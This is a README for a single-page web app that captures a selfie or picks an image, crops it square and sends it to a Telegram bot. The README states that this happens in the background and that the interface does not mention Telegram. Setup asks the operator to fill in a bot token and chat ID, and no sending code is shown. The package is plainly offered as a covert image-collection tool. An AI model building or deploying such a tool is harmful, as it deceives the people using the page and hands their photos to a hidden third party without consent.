# Image Uploader (Web)

This package contains a single-page web app that:

- Lets a user take a selfie (front camera) or select an image from device.
- Crops the image to 1:1 (square) ratio.
- Sends the cropped image to a Telegram bot using the Bot API in the background (UI does not mention Telegram).

## Files
- `index.html` — The full app. Edit the top `BOT_TOKEN` and `CHAT_ID` variables before use.

## Setup
1. Download and extract the ZIP.
2. Open `index.html` in an editor and set the values near the top:
```js
const BOT_TOKEN = "";
const CHAT_ID = "";
```
3. Save and host the file (or open locally). For camera access, open the page over `https` or using `http://localhost`.

## Security note
Do **not** push your bot token publicly. Keep it safe. This repo intentionally leaves the token and chat id empty for you to fill in locally.

## License
MIT
